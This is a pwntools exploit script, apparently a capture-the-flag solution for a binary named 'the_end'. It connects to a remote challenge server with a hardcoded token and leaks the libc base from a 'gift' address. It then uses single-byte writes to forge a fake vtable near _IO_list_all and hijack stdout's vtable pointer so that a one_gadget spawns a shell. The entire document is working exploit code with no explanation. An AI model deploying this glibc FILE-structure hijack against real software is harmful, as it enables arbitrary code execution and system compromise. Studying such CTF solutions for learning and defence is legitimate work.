from pwn import *
#context.log_level = "debug"

REMOTE = 1

if REMOTE:
    sh = remote("150.109.44.250", 20002)
    sh.recvuntil("token:")
    sh.sendline("OtHPZK42sCF3Ri1eAPuSYTCGEUNfhKew")
else:
    sh = process("./the_end", env={'LD_PRELOAD':'./libc64.so'})

elf = ELF("./the_end")
libc = ELF("./libc64.so")
one_offset = 0xf1147

sh.recvuntil("gift ")
sleep_addr = int(sh.recvuntil(",")[:-1].strip(), 16)
libc_base = sleep_addr - libc.symbols["sleep"]
sh.recvline()

log.success("sleep's address: %s" %hex(sleep_addr))
log.success("libc's base: %s" %hex(libc_base))

one_addr = one_offset + libc_base
log.success("onegadget's address: %s" %hex(one_addr))

io_list_all = libc_base + libc.symbols["_IO_list_all"]
log.success("IO_list_all: %s" %hex(io_list_all))

fake_vtable_addr = io_list_all - 0x140
log.success("fake vtable data's address: %s" %hex(fake_vtable_addr))
fake_vtable_overflow = fake_vtable_addr + 0x18
log.success("fake vatble->_overflow's address: %s" %hex(fake_vtable_overflow))
vtable_ptr_addr = io_list_all + 0x100 + 0xd8
log.success("IO_stdout -> vtable's address: %s" %hex(vtable_ptr_addr))
io_write_ptr = io_list_all + 0x100 + 0x28
log.success("IO_stdout -> _IO_write_ptr's address: %s" %hex(io_write_ptr))


def change_one_byte(address, byte):
    sh.send(address)
    sh.send(byte)


change_one_byte(p64(fake_vtable_overflow), p64(one_addr)[0])
change_one_byte(p64(fake_vtable_overflow+1), p64(one_addr)[1])
change_one_byte(p64(fake_vtable_overflow+2), p64(one_addr)[2])
change_one_byte(p64(vtable_ptr_addr+1), p64(fake_vtable_addr)[1])
change_one_byte(p64(io_write_ptr), chr(0xff))
sh.interactive()
